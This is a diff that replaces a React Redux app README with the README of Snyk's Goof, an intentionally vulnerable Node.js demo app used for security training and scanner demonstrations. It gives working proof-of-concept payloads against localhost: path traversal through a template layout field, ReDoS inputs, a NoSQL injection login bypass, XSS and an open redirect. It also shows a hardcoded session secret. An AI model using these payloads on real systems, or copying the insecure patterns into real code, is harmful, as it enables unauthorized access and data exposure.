@@ -1,104 +1,206 @@
-# React Redux CRUD App
+# Goof - Snyk's vulnerable demo app
+[![Known Vulnerabilities](https://snyk.io/test/github/snyk/goof/badge.svg?style=flat-square)](https://snyk.io/test/github/snyk/goof)
 
-**Note: As of Nov 30th 2016, the code has been updated to work w/ latest versions of its dependencies!**
+A vulnerable Node.js demo application, based on the [Dreamers Lab tutorial](http://dreamerslab.com/blog/en/write-a-todo-list-with-express-and-mongodb/).
 
-<img src='https://david-dm.org/rajaraodv/react-redux-blog.svg' />
+## Features
 
-#Live App
-https://protected-escarpment-79486.herokuapp.com/
+This vulnerable app includes the following capabilities to experiment with:
+* [Exploitable packages](#exploiting-the-vulnerabilities) with known vulnerabilities
+* [Docker Image Scanning](#docker-image-scanning) for base images with known vulnerabilities in system libraries
+* [Runtime alerts](#runtime-alerts) for detecting an invocation of vulnerable functions in open source dependencies
 
-#Blogs
-🎉 If you like any of the posts, please share it on Twitter (<a href="https://twitter.com/rajaraodv">@rajaraodv</a>)🎉
+## Running
+```bash
+mongod &
 
-1. <a href="https://medium.com/@rajaraodv/step-by-step-guide-to-building-react-redux-apps-using-mocks-48ca0f47f9a#.s7zsgq3u1" target="_blank">Step by Step Guide To Building React Redux Apps</a>
-2.  <a href="https://medium.com/@rajaraodv/a-guide-for-building-a-react-redux-crud-app-7fe0b8943d0f#.g99gruhdz" target="_blank">A Guide For Building A React Redux CRUD App (3-page app)</a>
-3.  <a href="https://medium.com/@rajaraodv/using-middlewares-in-react-redux-apps-f7c9652610c6#.oentrjqpj" target="_blank">Using Middlewares In React Redux Apps</a>
-4.  <a href="https://medium.com/@rajaraodv/adding-a-robust-form-validation-to-react-redux-apps-616ca240c124#.jq013tkr1" target="_blank">Adding A Robust Form Validation To React Redux Apps</a> (Note: There has been significant change in redux-form lib and the latest code only reflects half of what's in the blog)
-5.  <a href="https://medium.com/@rajaraodv/securing-react-redux-apps-with-jwt-tokens-fcfe81356ea0#.xci6o9s6w" target="_blank">Securing React Redux Apps With JWT Tokens</a>
-6.  <a href="https://medium.com/@rajaraodv/handling-transactional-emails-in-react-redux-apps-8b1134748f76#.a24nenmnt" target="_blank">Handling Transactional Emails In React Redux Apps</a>
-7.  <a href="https://medium.com/@rajaraodv/the-anatomy-of-a-react-redux-app-759282368c5a#.xufq689g0" target="_blank">The Anatomy Of A React Redux App</a>
-
-
-
-
-
-#Running On Heroku
-You can create your own version of the app (including MongoDB!)
-<br/>
-[![Deploy](https://www.herokucdn.com/deploy/button.png)](https://heroku.com/deploy)
-
-#Local Installation
-1. Install <a href="https://nodejs.org" target="_blank">Node.js</a> 
-2. Install <a target="_blank" href="https://docs.mongodb.org/manual/tutorial/install-mongodb-on-os-x/#install-mongodb-community-edition-with-homebrew">MongoDB</a>
-3. `git clone https://github.com/rajaraodv/react-redux-blog.git`
-4. `cd react-redux-blog`
-5. `npm install`
-6. Create a free <a href="https://postmarkapp.com" target="_blank">PostMark</a> account for sending (confirm email, forgot pwd) emails.
-  * Export Postmark credentials to environment
-  * `export POSTMARK_API_TOKEN=<getApiTokenFromWInPostmark>`
-  * Alternatively, you can run the app on Heroku, add Postmark addon (which adds a free account and sets `POSTMARK_API_TOKEN` to the app running on Heroku). You can then get that `POSTMARK_API_TOKEN` by running: `heroku config:get POSTMARK_API_TOKEN` and then export the token to the terminal. This will now allow you to send email from localhost.
-
-####Preventing Emails From Getting Blocked by GMail, Yahoo etc.
-NOTE: In order to send email via PostMark or Sendgrid, you need to verify sender's email(from address). In PostMark you can do that by setting your company or other private email(e.g. raja@rao.com) and verifying that. Then you can use **THAT** company or private email(e.g. raja@rao.com) in the FROM address.
-
-
-#Running Locally
-*You need two terminal windows open*, one for client and the other for server.
-
-####Development
-1. In terminal 1, 
-	1. `export JWT_SECRET=somesecretstring` <-- This is used to generate JWT tokens.
-	2. `export POSTMARK_API_TOKEN=<getApiTokenFromWInPostmark>` <-- Email
-	3. `export FROM_EMAIL=<yourFromEmailThatIsRegisteredInPostMark> <-- "From"-Email Address that you verified w/ PostMark
-	4. run `npm start`. This runs the app server (Express). 
-2. In terminal 2, run: `npm run dev`. This runs the development server(webpack-dev-server).
-3. Open browser and go to: `localhost:8080`
-
+git clone https://github.com/snyk-labs/nodejs-goof
+npm install
+npm start
 ```
-export JWT_SECRET=somesecret
-export POSTMARK_API_TOKEN=bla-bla-bla-9619-a6d1185548cd
-export FROM_EMAIL=yourcompanyemail@company.com
-export NODE_ENV=development
+This will run Goof locally, using a local mongo on the default port and listening on port 3001 (http://localhost:3001)
+
+## Running with docker-compose
+```bash
+docker-compose up --build
+docker-compose down
 ```
 
+### Heroku usage
+Goof requires attaching a MongoLab service to be deployed as a Heroku app. 
+That sets up the MONGOLAB_URI env var so everything after should just work. 
 
-####Note: If you open `localhost:3000` in browser, you'll see a "stale" production app, so while in development, **always go to `localhost:8080`**
+### CloudFoundry usage
+Goof requires attaching a MongoLab service and naming it "goof-mongo" to be deployed on CloudFoundry. 
+The code explicitly looks for credentials to that service. 
 
-####Production
-In production, we need to compile the **latest** client js and place it to `public` folder. This allows the main app server(Express) to also show the final app.
+### Cleanup
+To bulk delete the current list of TODO items from the DB run:
+```bash
+npm run cleanup
+```
 
-1. Generate latest React app: `npm run build`.
-2. In terminal 1, run `npm start`. It will be running both the server and the client.
-3. Open browser and go to : `localhost:3000`.
+## Exploiting the vulnerabilities
+
+This app uses npm dependencies holding known vulnerabilities,
+as well as insecure code that introduces code-level vulnerabilities.
+
+The `exploits/` directory includes a series of steps to demonstrate each one.
+
+### Vulnerabilities in open source dependencies
+
+Here are the exploitable vulnerable packages:
+- [Mongoose - Buffer Memory Exposure](https://snyk.io/vuln/npm:mongoose:20160116) - requires a version <= Node.js 8. For the exploit demo purposes, one can update the Dockerfile `node` base image to use `FROM node:6-stretch`.
+- [st - Directory Traversal](https://snyk.io/vuln/npm:st:20140206)
+- [ms - ReDoS](https://snyk.io/vuln/npm:ms:20151024)
+- [marked - XSS](https://snyk.io/vuln/npm:marked:20150520)
+
+### Vulnerabilities in code
+
+* Open Redirect
+* NoSQL Injection
+* Code Injection
+* Command execution
+* Cross-site Scripting (XSS)
+* Information exposure via Hardcoded values in code
+* Security misconfiguration exposes server information 
+* Insecure protocol (HTTP) communication 
+
+#### Code injection
+
+The page at `/account_details` is rendered as an Handlebars view.
+
+The same view is used for both the GET request which shows the account details, as well as the form itself for a POST request which updates the account details. A so-called Server-side Rendering.
+
+The form is completely functional. The way it works is, it receives the profile information from the `req.body` and passes it, as-is to the template. This however means, that the attacker is able to control a variable that flows directly from the request into the view template library.
+
+You'd think that what's the worst that can happen because we use a validation to confirm the expected input, however the validation doesn't take into account a new field that can be added to the object, such as `layout`, which when passed to a template language, could lead to Local File Inclusion (Path Traversal) vulnerabilities. Here is a proof-of-concept showing it:
+
+```sh
+curl -X 'POST' --cookie c.txt --cookie-jar c.txt -H 'Content-Type: application/json' --data-binary '{"username": "admin@snyk.io", "password": "SuperSecretPassword"}' 'http://localhost:3001/login'
+```
+
+```sh
+curl -X 'POST' --cookie c.txt --cookie-jar c.txt -H 'Content-Type: application/json' --data-binary '{"email": "admin@snyk.io", "firstname": "admin", "lastname": "admin", "country": "IL", "phone": "+972551234123",  "layout": "./../package.json"}' 'http://localhost:3001/account_details'
+```
+
+Actually, there's even another vulnerability in this code.
+The `validator` library that we use has several known regular expression denial of service vulnerabilities. One of them, is associated with the email regex, which if validated with the `{allow_display_name: true}` option then we can trigger a denial of service for this route:
+
+```sh
+curl -X 'POST' -H 'Content-Type: application/json' --data-binary "{\"email\": \"`seq -s "" -f "<" 100000`\"}" 'http://localhost:3001/account_details'
+```
+
+The `validator.rtrim()` sanitizer is also vulnerable, and we can use this to create a similar denial of service attack:
+
+```sh
+curl -X 'POST' -H 'Content-Type: application/json' --data-binary "{\"email\": \"someone@example.com\", \"country\": \"nop\", \"phone\": \"0501234123\", \"lastname\": \"nop\", \"firstname\": \"`node -e 'console.log(" ".repeat(100000) + "!")'`\"}" 'http://localhost:3001/account_details'
+```
+
+#### NoSQL injection
+
+A POST request to `/login` will allow for authentication and signing-in to the system as an administrator user.
+It works by exposing `loginHandler` as a controller in `routes/index.js` and uses a MongoDB database and the `User.find()` query to look up the user's details (email as a username and password). One issue is that it indeed stores passwords in plaintext and not hashing them. However, there are other issues in play here.
 
 
+We can send a request with an incorrect password to see that we get a failed attempt
+```sh
+echo '{"username":"admin@snyk.io", "password":"WrongPassword"}' | http --json $GOOF_HOST/login -v
+```
 
-#Cloning Locally And Pushing To Heroku
-Running your own instance on <a href="https://heroku.com">Heroku</a>.
+And another request, as denoted with the following JSON request to sign-in as the admin user works as expected:
+```sh
+echo '{"username":"admin@snyk.io", "password":"SuperSecretPassword"}' | http --json $GOOF_HOST/login -v
+```
 
-1. `git clone https://github.com/rajaraodv/react-redux-blog.git`
-2. `cd react-redux-blog`
-3. `heroku login` (enter heroku credentials)
-4. `heroku init`
-5. `heroku create` 
-6. `heroku addons:create mongolab`  <-- Add Mongolab test DB (free tier)
-7. `heroku addons:create postmark:10k` <-- Postmark Email (free tier)
-8. `git push heroku master`
+However, what if the password wasn't a string? what if it was an object? Why would an object be harmful or even considered an issue?
+Consider the following request:
+```sh
+echo '{"username": "admin@snyk.io", "password": {"$gt": ""}}' | http --json $GOOF_HOST/login -v
+```
 
+We know the username, and we pass on what seems to be an object of some sort.
+That object structure is passed as-is to the `password` property and has a specific meaning to MongoDB - it uses the `$gt` operation which stands for `greater than`. So, we in essence tell MongoDB to match that username with any record that has a password that is greater than `empty string` which is bound to hit a record. This introduces the NoSQL Injection vector.
 
-###Making changes to your app and pushing it to Heroku
-Everytime you make changes to the front end, you need to build it, and do git commit before pushing it to Heroku test server.
+#### Open redirect
 
-1. `npm run build` #build new React app JS
-2. `git add .` #Add change to git
-3. `git commit -m "<your comment>" 
-4. `git push heroku master`
-5. `heroku open`
+The `/admin` view introduces a `redirectPage` query path, as follows in the admin view:
 
-I usually have something like below that combines all the steps. I just change the commit message everytime.
+```
+<input type="hidden" name="redirectPage" value="<%- redirectPage %>" />
+```
 
-`npm run build && git add . && git commit -m "made changes" && git push heroku master && heroku open`
+One fault here is that the `redirectPage` is rendered as raw HTML and not properly escaped, because it uses `<%- >` instead of `<%= >`. That itself, introduces a Cross-site Scripting (XSS) vulnerability via:
 
+```
+http://localhost:3001/login?redirectPage="><script>alert(1)</script>
+```
 
+To exploit the open redirect, simply provide a URL such as `redirectPage=https://google.com` which exploits the fact that the code doesn't enforce local URLs in `index.js:72`.
 
+#### Hardcoded values - session information
 
+The application initializes a cookie-based session on `app.js:40` as follows:
+
+```js
+app.use(session({
+  secret: 'keyboard cat',
+  name: 'connect.sid',
+  cookie: { secure: true }
+}))
+```
+
+As you can see, the session `secret` used to sign the session is a hardcoded sensitive information inside the code.
+
+First attempt to fix it, can be to move it out to a config file such as:
+```js
+module.exports = {
+    cookieSecret: `keyboard cat`
+}
+```
+
+And then require the configuration file and use it to initialize the session.
+However, that still maintains the secret information inside another file, and Snyk Code will warn you about it.
+
+Another case we can discuss here in session management, is that the cookie setting is initialized with `secure: true` which means it will only be transmitted over HTTPS connections. However, there's no `httpOnly` flag set to true, which means that the default false value of it makes the cookie accessible via JavaScript. Snyk Code highlights this potential security misconfiguration so we can fix it. We can note that Snyk Code shows this as a quality information, and not as a security error.
+
+Snyk Code will also find hardcoded secrets in source code that isn't part of the application logic, such as `tests/` or `examples/` folders. We have a case of that in this application with the `tests/authentication.component.spec.js` file. In the finding, Snyk Code will tag it as `InTest`, `Tests`, or `Mock`, which help us easily triage it and indeed ignore this finding as it isn't actually a case of information exposure.
+
+## Docker Image Scanning
+
+The `Dockerfile` makes use of a base image (`node:6-stretch`) that is known to have system libraries with vulnerabilities.
+
+To scan the image for vulnerabilities, run:
+```bash
+snyk test --docker node:6-stretch --file=Dockerfile
+```
+
+To monitor this image and receive alerts with Snyk:
+```bash
+snyk monitor --docker node:6-stretch
+```
+
+## Runtime Alerts
+
+Snyk provides the ability to monitor application runtime behavior and detect an invocation of a function is known to be vulnerable and used within open source dependencies that the application makes use of.
+
+The agent is installed and initialized in [app.js](./app.js#L5).
+
+For the agent to report back to your snyk account on the vulnerabilities it detected it needs to know which project on Snyk to associate with the monitoring. Due to that, we need to provide it with the project id through an environment variable `SNYK_PROJECT_ID`
+
+To run the Node.js app with runtime monitoring:
+```bash
+SNYK_PROJECT_ID=<PROJECT_ID> npm start
+```
+
+** The app will continue to work normally even if it's not provided a project id
+
+## Fixing the issues
+To find these flaws in this application (and in your own apps), run:
+```
+npm install -g snyk
+snyk wizard
+```
+
+In this application, the default `snyk wizard` answers will fix all the issues.
+When the wizard is done, restart the application and run the exploits again to confirm they are fixed.
